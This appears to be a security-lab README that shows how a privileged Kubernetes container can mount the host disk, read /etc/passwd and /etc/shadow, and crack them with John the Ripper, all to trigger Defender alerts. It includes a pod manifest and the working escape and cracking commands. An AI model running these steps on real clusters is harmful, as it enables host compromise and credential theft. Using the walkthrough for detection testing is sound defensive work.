# Privileged Container Detected

Machine logs indicate that a privileged Docker container is running. A privileged container has a full access to the host's resources. If compromised, an attacker can use the privileged container to gain access to the host machine

we will show how within a privilege container and no restrictions from the unerlaying node, we can mount a volume from the node
As privilege container, we can get into the mounted volume and access the /etc and crack the passwords with john the rieper 

The privileged pod definition lives in
[`../hardening-labs-demo/privileged-container.yaml`](../hardening-labs-demo/privileged-container.yaml):

```
apiVersion: v1
kind: Pod
metadata:
  name: security-context-demo
  namespace: hardening-demo
spec:
  volumes:
  - name: sec-ctx-vol
    hostPath:
      path: /etc
  containers:
  - name: sec-ctx-pod
    image: IMAGE_PLACEHOLDER
    command: [ "sh", "-c", "sleep 999" ]
    volumeMounts:
    - name: sec-ctx-vol
      mountPath: /data
    securityContext:
      privileged: true
```

It's deployed via CI/CD (see [`../hardening-labs-demo/README.md`](../hardening-labs-demo/README.md))
into the `hardening-demo` namespace, not applied locally.

we access the running container

```
kubectl exec -it <name-of-priv-container> -- /bin/bash
```
Now we will try to mount the volumes from the host OS into the container, in a privileged container this is possible not in a normal container

```
 mount /dev/sda1 /mnt
 ```

```
cd /mnt/etc
```
 In a priv container we can get into the /etc and crack the passwords with john the reaper!

 ```
 apt-get install john
 ```

 ```
 unshadow passwd shadow > /tmp/unshadow
 ```
```
cd /tmp
```
```
john unshadow 
```

Now, wait until Defender creates one alert for the detection of a Container with a sensitive volume mount detected

![sesitive mount](/images/sensitive-mount.png)


Also, Defender will create another alert for Privileged container detected

![credential-dumping](/images/priv-container.png)